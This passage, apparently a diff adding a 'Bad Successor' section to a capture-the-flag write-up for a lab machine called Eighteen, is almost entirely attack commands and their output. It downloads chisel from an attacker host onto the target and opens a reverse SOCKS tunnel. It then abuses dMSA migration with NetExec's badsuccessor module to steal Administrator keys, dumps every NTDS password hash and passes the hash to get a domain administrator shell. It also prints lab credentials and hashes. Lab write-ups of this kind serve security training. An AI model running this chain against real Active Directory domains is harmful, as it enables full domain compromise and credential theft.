@@ -265,3 +265,179 @@ The command completed successfully.
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
+## Bad Successor
+
+```bash
+*Evil-WinRM* PS C:\programdata> wget http://10.10.14.77:8080/chisel.exe -outfile chisel.exe
+```
+
+```bash
+*Evil-WinRM* PS C:\programdata> .\chisel.exe client 10.10.14.77:8080 R:socks
+```
+
+```bash
+/chisel server -p 8080 --socks5 --reverse
+```
+
+```bash
+proxychains netexec smb dc01.eighteen.htb
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ proxychains netexec ldap eighteen.htb -M badsuccessor -u adam.scott -p iloveyou1
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:636  ...  OK
+LDAP        10.129.97.251   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert)
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK
+LDAP        10.129.97.251   389    DC01             [+] eighteen.htb\adam.scott:iloveyou1 
+BADSUCCE... 10.129.97.251   389    DC01             [+] Found domain controller with operating system Windows Server 2025: 224.0.0.1 (DC01.eighteen.htb)
+BADSUCCE... 10.129.97.251   389    DC01             [+] Found 1 results
+BADSUCCE... 10.129.97.251   389    DC01             IT (S-1-5-21-1152179935-589108180-1989892463-1604), OU=Staff,DC=eighteen,DC=htb
+```
+
+```bash
+┌──(kali㉿kali)-[/opt/NetExec]
+└─$ git fetch origin pull/1163/head:badsuccessor
+remote: Enumerating objects: 18, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Total 18 (delta 11), reused 11 (delta 11), pack-reused 6 (from 2)
+Unpacking objects: 100% (18/18), 18.70 KiB | 2.34 MiB/s, done.
+From https://github.com/Pennyw0rth/NetExec
+ * [new ref]           refs/pull/1163/head -> badsuccessor
+                                                                                                                                                                 
+┌──(kali㉿kali)-[/opt/NetExec]
+└─$ git checkout badsuccessor                   
+Switched to branch 'badsuccessor'
+```
+
+```bash
+┌──(kali㉿kali)-[/opt/NetExec]
+└─$ proxychains netexec ldap eighteen.htb -u adam.scott -p iloveyou1 -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb' DMSA_NAME=generic_dmsa TARGET_ACCOUNT=Administrator
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:636  ...  OK
+LDAP        10.129.97.251   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert) 
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK
+LDAP        10.129.97.251   389    DC01             [+] eighteen.htb\adam.scott:iloveyou1 
+BADSUCCE... 10.129.97.251   389    DC01             [+] Found DC with Windows Server 2025: 224.0.0.1 (DC01.eighteen.htb)
+BADSUCCE... 10.129.97.251   389    DC01             [+] dMSA 'generic_dmsa$' created at CN=generic_dmsa,OU=Staff,DC=eighteen,DC=htb
+BADSUCCE... 10.129.97.251   389    DC01             DNS Hostname: generic_dmsa.eighteen.htb
+BADSUCCE... 10.129.97.251   389    DC01             Migration state: 2 (completed)
+BADSUCCE... 10.129.97.251   389    DC01             Target account: CN=Administrator,CN=Users,DC=eighteen,DC=htb
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK
+BADSUCCE... 10.129.97.251   389    DC01             [-] Failed to get TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\adam.scott\Documents> Get-Date
+
+Thursday, November 12, 2026 1:08:25 PM
+```
+```bash
+┌──(kali㉿kali)-[/opt/NetExec]
+└─$ sudo timedatectl set-ntp false
+[sudo] password for kali: 
+                                                                                                                                                                 
+┌──(kali㉿kali)-[/opt/NetExec]
+└─$ sudo timedatectl set-time "2026-11-12 13:09:20"
+                                                                                                                                                                  
+┌──(kali㉿kali)-[/opt/NetExec]
+└─$ timedatectl status                                                          
+               Local time: Thu 2026-11-12 13:09:36 EST
+           Universal time: Thu 2026-11-12 18:09:36 UTC
+                 RTC time: Thu 2026-11-12 18:09:37
+                Time zone: America/New_York (EST, -0500)
+System clock synchronized: no
+              NTP service: inactive
+          RTC in local TZ: no
+```
+
+```bash
+┌──(kali㉿kali)-[/opt/NetExec]                                                                                                                                    
+└─$ proxychains netexec ldap eighteen.htb -u adam.scott -p iloveyou1 -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb' DMSA_NAME=generic_dmsa TARGET_ACC$
+UNT=Administrator                                                                                                                                                 
+[proxychains] config file found: /etc/proxychains4.conf                                                                                                           
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                            
+[proxychains] DLL init: proxychains-ng 4.17                                     
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK                                                                                  
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:636  ...  OK
+LDAP        10.129.97.251   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding
+:No TLS cert)                                                                                                                                                     
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:389  ...  OK                                                                                  
+LDAP        10.129.97.251   389    DC01             [+] eighteen.htb\adam.scott:iloveyou1  
+BADSUCCE... 10.129.97.251   389    DC01             [+] Found DC with Windows Server 2025: 224.0.0.1 (DC01.eighteen.htb)
+BADSUCCE... 10.129.97.251   389    DC01             [+] dMSA 'generic_dmsa$' created at CN=generic_dmsa,OU=Staff,DC=eighteen,DC=htb
+BADSUCCE... 10.129.97.251   389    DC01             DNS Hostname: generic_dmsa.eighteen.htb
+BADSUCCE... 10.129.97.251   389    DC01             Migration state: 2 (completed)
+BADSUCCE... 10.129.97.251   389    DC01             Target account: CN=Administrator,CN=Users,DC=eighteen,DC=htb
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK                                                                                   
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.97.251:88  ...  OK                                                                                   
+BADSUCCE... 10.129.97.251   389    DC01             [+] Current keys:
+BADSUCCE... 10.129.97.251   389    DC01             EncryptionTypes.aes256_cts_hmac_sha1_96: eb4fbeedf8c3e947e3b09d9c48cdb8017fe8069ee8164650f80c47acd30443a0
+BADSUCCE... 10.129.97.251   389    DC01             EncryptionTypes.aes128_cts_hmac_sha1_96: 7ed6c2bb833c8cf050b07062453b3765
+BADSUCCE... 10.129.97.251   389    DC01             EncryptionTypes.rc4_hmac: a332c8af9ec980f934af7dacf82f20de
+BADSUCCE... 10.129.97.251   389    DC01             [+] Previous keys:
+BADSUCCE... 10.129.97.251   389    DC01             EncryptionTypes.rc4_hmac: 0b133be956bfaddf9cea56701affddec
+BADSUCCE... 10.129.97.251   389    DC01             [+] Service ticket saved to /home/kali/.nxc/modules/badsuccessor/generic_dmsa$.ccache
+```
+
+```bash
+┌──(kali㉿kali)-[/opt/NetExec]
+└─$ KRB5CCNAME=/home/kali/.nxc/modules/badsuccessor/generic_dmsa\$.ccache proxychains -q netexec smb dc01.eighteen.htb --use-kcache --ntds 
+SMB         dc01.eighteen.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:eighteen.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         dc01.eighteen.htb 445    DC01             [+] eighteen.htb\generic_dmsa$ from ccache (Pwn3d!)
+SMB         dc01.eighteen.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc01.eighteen.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
+SMB         dc01.eighteen.htb 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc01.eighteen.htb 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a7c7a912503b16d8402008c1aebdb649:::
+SMB         dc01.eighteen.htb 445    DC01             mssqlsvc:1601:aad3b435b51404eeaad3b435b51404ee:c44d16951b0810e8f3bbade300966ec4:::
+SMB         dc01.eighteen.htb 445    DC01             eighteen.htb\jamie.dunn:1606:aad3b435b51404eeaad3b435b51404ee:9fbaaf9e93e576187bb840e93971792a:::
+SMB         dc01.eighteen.htb 445    DC01             eighteen.htb\jane.smith:1607:aad3b435b51404eeaad3b435b51404ee:42554e3213381f9d1787d2dbe6850d21:::
+SMB         dc01.eighteen.htb 445    DC01             eighteen.htb\alice.jones:1608:aad3b435b51404eeaad3b435b51404ee:43f8a72420ee58573f6e4f453e72843a:::
+SMB         dc01.eighteen.htb 445    DC01             eighteen.htb\adam.scott:1609:aad3b435b51404eeaad3b435b51404ee:9964dae494a77414e34aff4f34412166:::
+SMB         dc01.eighteen.htb 445    DC01             eighteen.htb\bob.brown:1610:aad3b435b51404eeaad3b435b51404ee:7e86c41ddac3f95c986e0382239ab1ea:::
+SMB         dc01.eighteen.htb 445    DC01             eighteen.htb\carol.white:1611:aad3b435b51404eeaad3b435b51404ee:6056d42866209a6744cb6294df075640:::
+SMB         dc01.eighteen.htb 445    DC01             eighteen.htb\dave.green:1612:aad3b435b51404eeaad3b435b51404ee:7624e4baa9c950aa3e0f2c8b1df72ee9:::
+SMB         dc01.eighteen.htb 445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d79b6837ac78c51c79aab3d970875584:::
+SMB         dc01.eighteen.htb 445    DC01             generic_dmsa$:13111:aad3b435b51404eeaad3b435b51404ee:a332c8af9ec980f934af7dacf82f20de:::
+SMB         dc01.eighteen.htb 445    DC01             [+] Dumped 13 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_dc01.eighteen.htb_2026-11-12_220051.ntds of which 11 were added to the database
+SMB         dc01.eighteen.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc01.eighteen.htb 445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_dc01.eighteen.htb_2026-11-12_220051.ntds | cut -d ':' -f1
+```
+
+```bash
+┌──(kali㉿kali)-[/opt/NetExec]                                                                                                                                    
+└─$ evil-winrm -i dc01.eighteen.htb -u administrator -H 0b133be956bfaddf9cea56701affddec                                                                          
+                                                                                                                                                                  
+Evil-WinRM shell v3.9                                                                                                                                             
+                                                                                                                                                                  
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                  
+                                                                                                                                                                  
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+eighteen\administrator
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+eighteen\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+306*************************3b1c
+```
